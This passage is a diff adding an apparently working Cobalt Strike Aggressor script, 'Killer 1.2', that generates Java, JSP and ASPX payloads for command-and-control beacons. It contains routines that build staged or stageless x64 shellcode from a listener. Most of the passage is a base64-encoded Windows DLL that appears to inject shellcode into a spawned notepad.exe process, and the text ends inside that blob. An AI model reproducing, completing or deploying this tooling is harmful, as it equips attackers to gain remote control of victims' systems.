@@ -1,0 +1,381 @@
+# Killer 1.2
+# Generate Payload (JAVA 、 JSP 、ASPX)
+#
+# Author: ke
+# Reference:
+#     https://blog.cobaltstrike.com/2013/08/29/how-to-inject-shellcode-from-java/
+#     https://javasec.org/javase/JNI/
+
+# prepare payload
+sub setup_attack {
+    local('%options $script $payload');
+    %options = $3;
+
+    if (%options["stageless"] eq "true"){
+        # Generate stageless payload
+        println("stageless");
+        $payload = artifact_payload(%options["listener"], "raw", "x64");
+
+    }else{
+        # Generate stage payload
+        println("stager");
+        $payload = artifact_stager(%options["listener"], "raw", "x64");
+    }
+
+    # $b64payload now has my base64 encoded payload
+    $b64payload = base64_encode($payload);
+
+    $data = "";
+    $b64Dll = "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